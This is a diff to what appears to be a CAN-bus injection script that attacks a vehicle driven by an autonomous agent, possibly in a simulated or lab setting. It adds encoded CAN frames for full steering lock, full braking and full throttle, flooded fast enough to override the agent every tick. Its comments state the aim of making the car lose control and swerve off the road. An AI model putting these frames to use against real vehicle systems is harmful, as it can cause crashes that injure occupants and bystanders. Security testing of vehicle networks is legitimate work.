@@ -25,9 +25,10 @@ import can  # shim auto-loaded via .pth
 # lose control. The gentle README rate (0.3s) is too slow to override the
 # ~30 Hz agent and looks like normal driving.
 ATTACKS = {
-    # Full right-lock steering, DBC-encoded (SteeringPosition=1.0, valid checksum),
-    # flooded so it overrides the agent every tick -> car swerves off the road.
-    "steering": (0xC4,  "64640001010000ca", 0.02),
+    # DBC-encoded frames flooded so they override the agent every tick.
+    "steering": (0xC4,  "64640001010000ca", 0.02),   # SteeringPosition=1.0 -> full lock, swerve
+    "brake":    (0x1A0, "0000640100000065", 0.02),   # Brake_active=1, BrakePressed=1.0 -> full brake
+    "speed":    (0x1A0, "6410000000000074", 0.02),   # VehicleSpeed=100, MovingForward=1 -> full throttle
     "throttle": (0x1A0, "5508010100000012", 0.3),    # README payload, gentle (little visible effect)
 }
 which = sys.argv[1] if len(sys.argv) > 1 else "steering"
